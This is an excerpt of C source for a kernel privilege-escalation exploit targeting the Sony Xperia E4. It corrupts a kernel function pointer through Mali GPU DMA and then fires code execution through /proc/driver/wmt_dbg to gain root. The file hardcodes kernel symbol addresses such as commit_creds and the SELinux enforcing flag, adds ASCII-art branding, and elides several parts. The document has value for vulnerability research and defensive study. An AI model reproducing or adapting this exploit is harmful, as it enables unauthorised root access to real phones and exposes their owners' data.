/*
 * kort_xperia_e4.c - Overwrite kernel function pointer via Mali GPU DMA
 ...
 *   3. Trigger via /proc/driver/wmt_dbg -> code exec -> root
 */
...
// target stuff
#define TARGET_KERNEL_VA   	0xc07426d0	 // what we wanna write (not used)
#define TARGET_PHYS_ADDR   	0x80742000   // page-aligned physical address
#define TARGET_PAGE_OFFSET 	0x6d0        // offset within page we wanna write

//useful addresses
#define ENFORCING_ADDR	   	0xc0a7b438
#define COMMIT_CREDS	   	0xc006c438
#define PREPARE_KERNEL_CRED 0xc006c7e0
#define SHELLCODE_ADDR 		0x41414141
...
void important_ascii_art() {
    ...
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
	printf("\n\033[38;5;34m     Sony Xperia E4 (E2105)\033[0m\n\n");
}

int write_to_fd(int fd, const char *command) {
    ...
    if (bytes_written < 0) {
        perror("[-] Failed to write to /proc/driver/wmt_dbg");
        return -1;
    }
...
int main(void)
{
	...
	if (notif.type == _MALI_NOTIFICATION_PP_FINISHED) {
		...
		int wmt_fd = open(proc_path, O_WRONLY);
		if (wmt_fd < 0) {
			printf("[-] Failed to open /proc/driver/wmt_dbg\n");
			return -1;
		}
		printf("[+] Successfully opened /proc/driver/wmt_dbg (fd=%d)\n", wmt_fd);
		
		// Step 6: patch the free handler with the root shell function
		printf("\n[6] Triggering code execution via %s\n", proc_path);
		snprintf(command, sizeof(command), "1 42424242 42424242");
		write_to_fd(wmt_fd, command);
